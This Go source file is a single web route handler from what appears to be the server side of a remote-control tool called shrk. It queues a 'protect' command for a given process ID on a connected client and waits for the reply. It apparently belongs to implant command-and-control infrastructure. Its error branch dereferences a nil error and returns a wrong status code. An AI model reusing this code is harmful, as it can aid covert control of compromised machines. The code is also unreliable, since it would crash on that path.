package routes

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net/http"
	"path"
	"strconv"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_protect(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type

		res_str string
		job     *joblist.Job
		pid_buf *bytes.Buffer
		_pid    int64
		pid     int32

		err error
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	if _pid, err = strconv.ParseInt(c.Query("p"), 10, 32); err != nil {
		log.Debg("failed to convert PID: %s", err.Error())
		return util.RenderErr(c, "invalid PID", http.StatusBadRequest)
	}

	pid = int32(_pid)
	pid_buf = bytes.NewBuffer(nil)
	binary.Write(pid_buf, binary.LittleEndian, pid)

	data := util.NewBuffer(pid_buf.Bytes())
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_PROTECT, data, res); err != nil {
		log.Fail("failed to add protect job: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("protect job timed out for %s", client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res_str = res.String(); res_str != "success" {
		log.Debg("protect job failed for %s: %s", client.ID, res_str)
		return util.RenderErr(c,
			fmt.Sprintf("protect job failed: %s", err.Error()), http.StatusGatewayTimeout,
		)
	}

	return util.Redirect(c,
		path.Join("c", client.ID, "ps"),
	)
}
